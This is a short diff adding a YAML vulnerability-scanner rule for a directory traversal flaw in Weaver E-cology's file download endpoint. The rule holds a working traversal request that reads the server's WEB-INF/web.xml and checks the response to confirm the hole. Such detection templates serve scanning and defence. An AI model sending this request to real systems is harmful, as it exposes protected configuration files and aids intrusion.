@@ -1,0 +1,12 @@
+cve-id: ecology-filedownload-directorytraversal
+rules:
+  - method: GET
+    path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+severity:
+  medium
+type: 
+  directorytraversal
+
